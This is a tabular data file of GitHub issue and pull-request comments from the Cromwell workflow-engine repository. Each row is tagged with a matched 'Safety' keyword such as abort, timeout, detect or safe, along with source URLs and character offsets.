1; > `; > this is only 2 jobs but having a lot of jobs this will reduce the load a lot; > ; > kshakir @kshakir Aug 26 21:21; > True, Cromwell will end up in an endless loop if someone terminates the SGE job, or if the rc file doesn’t appear in general. One could use isAlive intermittently, but it was introduced mainly for recovering jobs at re-startup, & I would not have isAlive poll as often as we check for the rc file. Btw, GATK Queue actually only checks drmaa every 30 seconds, so that it doesn’t overload dispatchers. Something like isAlive could be checked with similar frequency. All this is a bigger discussion that could be tracked in a git issue.; > Separately, I am hearing from multiple people that the rc poll logs are spam. ; > ; > Peter van 't Hof @ffinfo Aug 26 21:44; > As already suggested in the PR, a actor pool would be better I think but that'",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1346#issuecomment-242961348:367,detect,detect,367,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1346#issuecomment-242961348,2,['detect'],['detect']
Safety,What is being done is not exactly what this ticket says but it does test that at least one job is recovered properly during centaur tests.; I think this can be closed,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2111#issuecomment-329782508:98,recover,recovered,98,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2111#issuecomment-329782508,1,['recover'],['recovered']
Safety,"What is the optimal order, and what would the effort be to implement it? Any risks?. Finally, how often do we get questions and complaints about it today? Do you expect that to go up in the near future?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1312#issuecomment-324418249:77,risk,risks,77,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1312#issuecomment-324418249,1,['risk'],['risks']
Safety,With the add-on that this should *not* find its way into runtime attributes .... This should be relatively low effort and risk. The risk would be that whenever we don't get something call caching related correct that causes a lot of angst,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1695#issuecomment-327550937:122,risk,risk,122,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1695#issuecomment-327550937,2,['risk'],['risk']
Safety,"Won't the `invalidate-bad-cache-results` setting work for you? It's not a timeout, it just tells Cromwell to gracefully handle missing files when attempting to retrieve from the cache. Seems to work pretty well in my hands (we have a similar situation here so I actually wrote a test for this).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5174#issuecomment-530831145:74,timeout,timeout,74,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5174#issuecomment-530831145,1,['timeout'],['timeout']
Safety,Yeah I thought about that too. A config flag might be a good safety net.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/305#issuecomment-161013035:61,safe,safety,61,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/305#issuecomment-161013035,1,['safe'],['safety']
Safety,"Yeah, my point is, this might also be an instance of circular references not being detected (i.e. we should catch things like `File gvcf = gvcf` regardless of where it appears)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2226#issuecomment-298740549:83,detect,detected,83,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2226#issuecomment-298740549,1,['detect'],['detected']
Safety,"Yeah, that sounds right to me. I'm not sure how PAPI could improve though, seeing as 4xx errors are generally not retryable. We do have logic in Cromwell to detect certain common pull failures [1], but I'm not sure this one [0] is common enough to merit inclusion as a special case. [0] `We're sorry, but this service is not available in your location`; [1] https://github.com/broadinstitute/cromwell/blob/d142bd4a9b890605a2e61ee6469f01a442dfb74e/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/PipelinesApiAsyncBackendJobExecutionActor.scala#L784-L813",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7132#issuecomment-1563477750:157,detect,detect,157,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7132#issuecomment-1563477750,1,['detect'],['detect']
Safety,"Yes that is correct. A future feature could be ""fail immediate"" which would terminate running jobs, but that isn't this one. > On Mar 18, 2016, at 11:55 AM, mcovarr notifications@github.com wrote:; > ; > To be clear, fail-fast should not attempt to abort currently running calls even if those calls might otherwise continue to run for a long time?; > ; > —; > You are receiving this because you authored the thread.; > Reply to this email directly or view it on GitHub",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/587#issuecomment-198425156:249,abort,abort,249,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/587#issuecomment-198425156,2,['abort'],['abort']
Safety,"Yes this is the default. I'm fine with changing the Swagger, though the delay in abort introduced by the sweep interval here is likely not as significant as the preexisting delay after restart... 🙂",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4401#issuecomment-440047520:81,abort,abort,81,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4401#issuecomment-440047520,1,['abort'],['abort']
Safety,Yes this pretty much always happens with the recover code I merged to develop yesterday.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1196#issuecomment-235593390:45,recover,recover,45,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1196#issuecomment-235593390,1,['recover'],['recover']
Safety,"Yes we can update the database manually but I hesitate to do that unless it's really serious. Since this specific ticket is not about aborts, should this be moved to a ticket about aborts?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1861#issuecomment-334867019:134,abort,aborts,134,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1861#issuecomment-334867019,2,['abort'],['aborts']
Safety,"You can now supply `meta` blocks at a workflow level, and those can contain outputs as well as inputs so I think I can safely close this.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1131#issuecomment-276483565:119,safe,safely,119,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1131#issuecomment-276483565,1,['safe'],['safely']
Safety,"You're right for the fail-fast, now only files that are actually referenced in a call as an input will be checked, and only at the call run-time. Basically workflow file inputs are just ""global input references"" that can be used to provide inputs for the calls and avoid having duplicates in the workflowinputs.json.; I'm not sure what it changes regarding shell expansions though.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/249#issuecomment-151542190:265,avoid,avoid,265,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/249#issuecomment-151542190,1,['avoid'],['avoid']
Safety,"Your DB has become too big. This means it will take too much time to open the database and you will get connection timeouts. (These files can be multiple GBs). Here is our database setup:; ```; database {; profile = ""slick.jdbc.HsqldbProfile$""; db {; driver = ""org.hsqldb.jdbcDriver""; # See http://hsqldb.org/doc/2.0/guide/dbproperties-chapt.html; # Shutdown=false. Cromwell will shutdown the database; # hsqlldb.default_table_type=cached. By default hsqldb uses in memory tables. ; # Setting this to cache for improved memory usage.; # hsqldb.result_max_memory_rows=10000 . Limits the amount of rows in memory for temp tables; # hsqldb.tx=mvcc cromwell default. Not changing it. Not clear what this does. http://hsqldb.org/doc/guide/sessions-chapt.html#snc_tx_mvcc; # hsqldb.large_data=true. Cromwell creates huge DBs that need to be opened.; # hsqldb.applog=1. Log errors.; # hsqldb.lob_compressed=true. Compress lobs. This saves a lot of space.; # hsqldb.script_format=3. Compress script. (uses gzip internally).; url = """"""; jdbc:hsqldb:file:cromwell-executions/cromwell-db/cromwell-db;; shutdown=false;; hsqldb.default_table_type=cached;hsqldb.tx=mvcc;; hsqldb.result_max_memory_rows=10000;; hsqldb.large_data=true;; hsqldb.applog=1;; hsqldb.lob_compressed=true;; hsqldb.script_format=3; """"""; # Override the cromwell default of only 3 seconds (3000 milliseconds) and allow for 300s to read the database file.; connectionTimeout = 300000; numThreads = 1; }; }; ```; Please note the `connectionTimeout = 300000` where we set the connection timeout to 5 minutes. This works for most cases. On a side note: HSQLDB has got to be the worst performing embedded database designed in the history of mankind. When running a decent-sized WDL workflow it can get 30 GB in memory! When using the file-based database it still needs 2 GB in memory (on top of the 1 GB that cromwell needs) is very slow, and creates a multiple GB file database. (EDIT: I checked my multiple run 100 sample RNA-seq pipeline that ha",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5271#issuecomment-624458757:115,timeout,timeouts,115,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5271#issuecomment-624458757,2,['timeout'],['timeouts']
Safety,a big issue w/ abort is not that it doesn't claim it aborted in the response but all hell breaks loose internally :),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2088#issuecomment-288836659:15,abort,abort,15,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2088#issuecomment-288836659,2,['abort'],"['abort', 'aborted']"
Safety,"ached. By default hsqldb uses in memory tables. ; # Setting this to cache for improved memory usage.; # hsqldb.result_max_memory_rows=10000 . Limits the amount of rows in memory for temp tables; # hsqldb.tx=mvcc cromwell default. Not changing it. Not clear what this does. http://hsqldb.org/doc/guide/sessions-chapt.html#snc_tx_mvcc; # hsqldb.large_data=true. Cromwell creates huge DBs that need to be opened.; # hsqldb.applog=1. Log errors.; # hsqldb.lob_compressed=true. Compress lobs. This saves a lot of space.; # hsqldb.script_format=3. Compress script. (uses gzip internally).; url = """"""; jdbc:hsqldb:file:cromwell-executions/cromwell-db/cromwell-db;; shutdown=false;; hsqldb.default_table_type=cached;hsqldb.tx=mvcc;; hsqldb.result_max_memory_rows=10000;; hsqldb.large_data=true;; hsqldb.applog=1;; hsqldb.lob_compressed=true;; hsqldb.script_format=3; """"""; # Override the cromwell default of only 3 seconds (3000 milliseconds) and allow for 300s to read the database file.; connectionTimeout = 300000; numThreads = 1; }; }; ```; Please note the `connectionTimeout = 300000` where we set the connection timeout to 5 minutes. This works for most cases. On a side note: HSQLDB has got to be the worst performing embedded database designed in the history of mankind. When running a decent-sized WDL workflow it can get 30 GB in memory! When using the file-based database it still needs 2 GB in memory (on top of the 1 GB that cromwell needs) is very slow, and creates a multiple GB file database. (EDIT: I checked my multiple run 100 sample RNA-seq pipeline that has run multiple times, using call-caching and sometimes with slightly different settings: **85 GB** in files for the database.); MySQL performs much better with cromwell, but is infeasible to use in a per-project, per-user fashion. [I am working on solving the problem using SQLite](https://github.com/broadinstitute/cromwell/issues/5490) but there is NO ETA, and I don't know if I will ever get it to work. Still it is worth trying.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5271#issuecomment-624458757:1542,timeout,timeout,1542,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5271#issuecomment-624458757,2,['timeout'],['timeout']
Safety,"akka.dispatchers.engine-dispatcher-29 INFO - WorkflowManagerActor WorkflowActor-796f3949-47e6-497e-9458-59ab53a063c6 is in a terminal state: WorkflowSucceededState; 2020-06-04 21:43:43,504 cromwell-system-akka.actor.default-dispatcher-56 ERROR - Carboniting failure: cromwell.services.MetadataTooLargeNumberOfRowsException: Metadata for workflow 796f3949-47e6-497e-9458-59ab53a063c6 exists indatabase, but cannot be served. This is done in order to avoid Cromwell failure: metadata is too large - 283000000 rows, and may cause Cromwell instance to die on attempt to read it in memory. Configured metadata safety limit is 1000000.. Marking as TooLargeToArchive; cromwell.services.MetadataTooLargeNumberOfRowsException: Metadata for workflow 796f3949-47e6-497e-9458-59ab53a063c6 exists indatabase, but cannot be served. This is done in order to avoid Cromwell failure: metadata is too large - 283000000 rows, and may cause Cromwell instance to die on attempt to read it in memory. Configured metadata safety limit is 1000000.; 	at cromwell.services.metadata.impl.builder.MetadataBuilderActor$$anonfun$2.applyOrElse(MetadataBuilderActor.scala:283); 	at cromwell.services.metadata.impl.builder.MetadataBuilderActor$$anonfun$2.applyOrElse(MetadataBuilderActor.scala:267); 	at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:38); 	at akka.actor.FSM.processEvent(FSM.scala:707); 	at akka.actor.FSM.processEvent$(FSM.scala:704); 	at cromwell.services.metadata.impl.builder.MetadataBuilderActor.akka$actor$LoggingFSM$$super$processEvent(MetadataBuilderActor.scala:245); 	at akka.actor.LoggingFSM.processEvent(FSM.scala:847); 	at akka.actor.LoggingFSM.processEvent$(FSM.scala:829); 	at cromwell.services.metadata.impl.builder.MetadataBuilderActor.processEvent(MetadataBuilderActor.scala:245); 	at akka.actor.FSM.akka$actor$FSM$$processMsg(FSM.scala:701); 	at akka.actor.FSM$$anonfun$receive$1.applyOrElse(FSM.scala:695); 	at akka.actor.Actor.aroundReceive(Actor.scala:539); 	at akka.ac",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5525#issuecomment-639142073:1086,safe,safety,1086,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5525#issuecomment-639142073,1,['safe'],['safety']
Safety,"arsing workflow as WDL draft-2; 2018-06-07 12:16:52,498 cromwell-system-akka.dispatchers.engine-dispatcher-47 ERROR - WorkflowManagerActor Workflow dd0b1399-ebb6-4d9b-89ea-7da193994220 failed (during MaterializingWorkflowDescriptorState): cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anon$1: Workflow input processing failed:; Boxed Error; scala.concurrent.impl.Promise$.resolver(Promise.scala:83); scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); scala.concurrent.impl.Promise$DefaultPromise.tryComplete(Promise.scala:280); scala.concurrent.Promise.complete(Promise.scala:49); scala.concurrent.Promise.complete$(Promise.scala:48); scala.concurrent.impl.Promise$DefaultPromise.complete(Promise.scala:183); scala.concurrent.Promise.failure(Promise.scala:100); scala.concurrent.Promise.failure$(Promise.scala:100); scala.concurrent.impl.Promise$DefaultPromise.failure(Promise.scala:183); cats.effect.IO.$anonfun$unsafeToFuture$2(IO.scala:328); scala.util.Either.fold(Either.scala:189); cats.effect.IO.$anonfun$unsafeToFuture$1(IO.scala:328); cats.effect.IO.$anonfun$unsafeToFuture$1$adapted(IO.scala:328); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:98); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:257); cats.effect.IO.unsafeToFuture(IO.scala:328); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:146); scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:303); scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); scala.runtime.java8.JFunction0",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457:99600,unsafe,unsafeToFuture,99600,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457,1,['unsafe'],['unsafeToFuture']
Safety,"ay be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf … <#m_3227077625045957240_> On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5977 <#5977>>, or unsubscribe https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ . — You are receiving this because you commented. Reply to this email directly, view it on GitHub <[#5977 (comment)](https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491)>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AF2E6EJEL23DXZQ4G3JVNQ3SPJKNNANCNFSM4S56ELLQ> . The weird thi",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046:2003,Timeout,TimeoutException,2003,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046,1,['Timeout'],['TimeoutException']
Safety,"b/googlecloudsdk/core/properties.py\"", line 1501, in _GetProperty\n value = _GetPropertyWithoutDefault(prop, properties_file)\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py\"", line 1539, in _GetPropertyWithoutDefault\n value = callback()\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py\"", line 693, in _GetGCEProject\n return c_gce.Metadata().Project()\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce.py\"", line 104, in Project\n gce_read.GOOGLE_GCE_METADATA_PROJECT_URI)\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/util/retry.py\"", line 155, in TryFunc\n return func(*args, **kwargs), None\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce.py\"", line 41, in _ReadNoProxyWithCleanFailures\n return gce_read.ReadNoProxy(uri)\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce_read.py\"", line 50, in ReadNoProxy\n request, timeout=timeout_property).read()\n File \""/usr/lib/python2.7/urllib2.py\"", line 401, in open\n response = self._open(req, data)\n File \""/usr/lib/python2.7/urllib2.py\"", line 419, in _open\n '_open', req)\n File \""/usr/lib/python2.7/urllib2.py\"", line 379, in _call_chain\n result = func(*args)\n File \""/usr/lib/python2.7/urllib2.py\"", line 1211, in http_open\n return self.do_open(httplib.HTTPConnection, req)\n File \""/usr/lib/python2.7/urllib2.py\"", line 1184, in do_open\n r = h.getresponse(buffering=True)\n File \""/usr/lib/python2.7/httplib.py\"", line 1072, in getresponse\n response.begin()\n File \""/usr/lib/python2.7/httplib.py\"", line 408, in begin\n version, status, reason = self._read_status()\n File \""/usr/lib/python2.7/httplib.py\"", line 366, in _read_status\n line = self.fp.readline()\n File \""/usr/lib/python2.7/socket.py\"", line 447, in readline\n data = self._sock.recv(self._rbufsize)\nsocket.timeout: timed out\n: ""; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-298633044:2455,timeout,timeout,2455,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-298633044,2,['timeout'],['timeout']
Safety,bb6-4d9b-89ea-7da193994220 failed (during MaterializingWorkflowDescriptorState): cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anon$1: Workflow input processing failed:; Boxed Error; scala.concurrent.impl.Promise$.resolver(Promise.scala:83); scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); scala.concurrent.impl.Promise$DefaultPromise.tryComplete(Promise.scala:280); scala.concurrent.Promise.complete(Promise.scala:49); scala.concurrent.Promise.complete$(Promise.scala:48); scala.concurrent.impl.Promise$DefaultPromise.complete(Promise.scala:183); scala.concurrent.Promise.failure(Promise.scala:100); scala.concurrent.Promise.failure$(Promise.scala:100); scala.concurrent.impl.Promise$DefaultPromise.failure(Promise.scala:183); cats.effect.IO.$anonfun$unsafeToFuture$2(IO.scala:328); scala.util.Either.fold(Either.scala:189); cats.effect.IO.$anonfun$unsafeToFuture$1(IO.scala:328); cats.effect.IO.$anonfun$unsafeToFuture$1$adapted(IO.scala:328); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:98); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:257); cats.effect.IO.unsafeToFuture(IO.scala:328); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:146); scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:303); scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); akka.dispatch.BatchingExecutor$BlockableBatc,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457:99754,unsafe,unsafeToFuture,99754,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457,1,['unsafe'],['unsafeToFuture']
Safety,"c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 [UUID(0123c178)]: Could not copy a suitable cache hit for 0123c178:GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1. EJEA attempted to copy 1 cache hits before failing. Of these 1 failed to copy and 0 were already blacklisted from previous attempts). Falling back to running job. As you can see, some small tasks worked but large tasks failed. > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You a",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807:2634,timeout,timeout,2634,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807,1,['timeout'],['timeout']
Safety,centaur now has abort tests,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2088#issuecomment-342579064:16,abort,abort,16,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2088#issuecomment-342579064,1,['abort'],['abort']
Safety,"cificity_oncotate_oncotated_target_seg_gt_file"": ""gs://broad-dsde-methods/cromwell-executions-eval-gatk-protected/crsp_validation_workflow/020aa0e3-d12f-4085-b8a7-1de06c8df598/call-specificity_oncotate/SM-74ND9.per_target.oncotated.txt"",; ""crsp_validation_workflow_specificity_run_sensitivity_precision_small_sens_file"": ""gs://broad-dsde-methods/cromwell-executions-eval-gatk-protected/crsp_validation_workflow/020aa0e3-d12f-4085-b8a7-1de06c8df598/call-specificity_run_sensitivity_precision/SM-74ND9.sens_prec.small_segs.tsv"",; ""crsp_validation_workflow_specificity_run_sensitivity_precision_del_sens_prec_file"": ""gs://broad-dsde-methods/cromwell-executions-eval-gatk-protected/crsp_validation_workflow/020aa0e3-d12f-4085-b8a7-1de06c8df598/call-specificity_run_sensitivity_precision/SM-74ND9.sens_prec.del.tsv""; },; ""id"": ""020aa0e3-d12f-4085-b8a7-1de06c8df598""; }; [INFO] [12/08/2016 21:02:52.660] [cromwell-system-akka.actor.default-dispatcher-3] [akka://cromwell-system/user/SingleWorkflowRunnerActor] SingleWorkflowRunnerActor writing metadata to /home/lichtens/test_eval/crsp_validation_input_files/crsp_validation_from_cromwell.json.metadata.json; [INFO] [12/08/2016 21:02:52.719] [shutdownHook1] [akka://cromwell-system/user/SingleWorkflowRunnerActor/WorkflowManagerActor] WorkflowManagerActor: Received shutdown signal.; [INFO] [12/08/2016 21:02:52.720] [cromwell-system-akka.actor.default-dispatcher-34] [akka://cromwell-system/deadLetters] Message [cromwell.engine.workflow.WorkflowManagerActor$AbortAllWorkflowsCommand$] from Actor[akka://cromwell-system/deadLetters] to Actor[akka://cromwell-system/deadLetters] was not delivered. [2] dead letters encountered. This logging can be turned off or adjusted with configuration settings 'akka.log-dead-letters' and 'akka.log-dead-letters-during-shutdown'.; Capturing latest dir...; 7d822ec4-ca21-4e05-94ad-9d16acd5e534; lichtens@lichtens-big:~/test_eval$; ```. Do you see it? Look at that last line! It's a prompt! Cromwell exited successfully!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-266019352:3315,Abort,AbortAllWorkflowsCommand,3315,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-266019352,1,['Abort'],['AbortAllWorkflowsCommand']
Safety,"com/broadinstitute/cromwell/blob/develop/core/src/main/resources/reference.conf) to solve the problem, but maybe it is better to have a `post-docker` configuration which is added to the pipeline similar to the `script-epilogue`. This would make easier the configuration of docker runs, separating submission and checks. By now, I will use the following local configuration to continue my work with the cromwell runner:. ```; include required(classpath(""application"")). ## keep always the workflow logs; workflow-options.workflow-log-temporary: false. backend.providers.Local.config {; ## limit the number of jobs; concurrent-job-limit = 15; # set the root directory to the run; filesystems.local {; ## do not allow copy (huge files); localization: [""hard-link"", ""soft-link""]; caching.duplication-strategy: [""hard-link"", ""soft-link""]; }; # custom submit-docker to workaround detached container due to timeout in the virtual machine; # first, we do not remove the container until it really finishes (no --rm flag); # if the docker run command fails, then it runs docker wait to wait until it finishes and store the return code; # if the docker run command fails, then it runs docker wait to return the real exit code even if detached; # once it finishes, removes the docker container with docker rm; # finally, returns the ""real return code"" stored; submit-docker = """"""; docker run \; --cidfile ${docker_cid} \; -i \; ${""--user "" + docker_user} \; --entrypoint /bin/bash \; -v ${cwd}:${docker_cwd} \; ${docker} ${script}; rc=$(docker wait `cat ${docker_cid}`); docker rm `cat ${docker_cid}`; exit $rc; """"""; }; ```. By the way, it looks like the configuration of the local backend in the docs is still under development (http://cromwell.readthedocs.io/en/develop/tutorials/LocalBackendIntro/). I think that this kind of things can be part of the docs if not included as default in the source code - let me know if I can do something to help documenting the local end, which I am using as my default one.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3370#issuecomment-371448526:1621,timeout,timeout,1621,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3370#issuecomment-371448526,1,['timeout'],['timeout']
